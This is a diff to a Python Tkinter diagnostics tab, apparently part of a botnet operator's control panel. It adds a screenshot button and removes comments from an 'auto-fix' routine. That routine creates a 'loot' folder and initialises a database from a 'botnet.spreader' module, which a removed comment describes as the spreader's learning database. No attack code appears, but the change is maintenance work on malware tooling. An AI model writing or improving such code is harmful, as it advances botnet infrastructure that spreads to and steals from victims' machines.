@@ -25,6 +25,7 @@ class DiagnosticTab(tk.Frame):
             ("Автоисправление", self.auto_fix),
             ("Пинг интернета", self.ping_internet),
             ("Информация о системе", self.system_info),
+            ("Сделать скриншоты", self.take_screenshots),
         ]
         for text, cmd in buttons:
             ttk.Button(btn_frame, text=text, command=cmd).pack(side=tk.LEFT, padx=2)
@@ -124,13 +125,10 @@ class DiagnosticTab(tk.Frame):
 
     def auto_fix(self):
         self.log("=== Автоисправление ===")
-        # Переустановка зависимостей
         self.install_dependencies()
-        # Проверка и создание папки loot
         if not os.path.exists("loot"):
             os.makedirs("loot")
             self.log("Создана папка loot")
-        # Инициализация базы обучения спредера
         try:
             from botnet.spreader import init_db
             import asyncio
@@ -154,3 +152,10 @@ class DiagnosticTab(tk.Frame):
             self.log(f"Текущая директория: {os.getcwd()}")
         except Exception as e:
             self.log(f"Ошибка: {e}")
+
+    def take_screenshots(self):
+        """Вызывает функцию создания скриншотов из главного окна"""
+        self.log("=== Запуск создания скриншотов ===")
+        app = self.winfo_toplevel().app
+        app.take_all_screenshots()
+        self.log("Скриншоты сохранены в папку screenshots/")
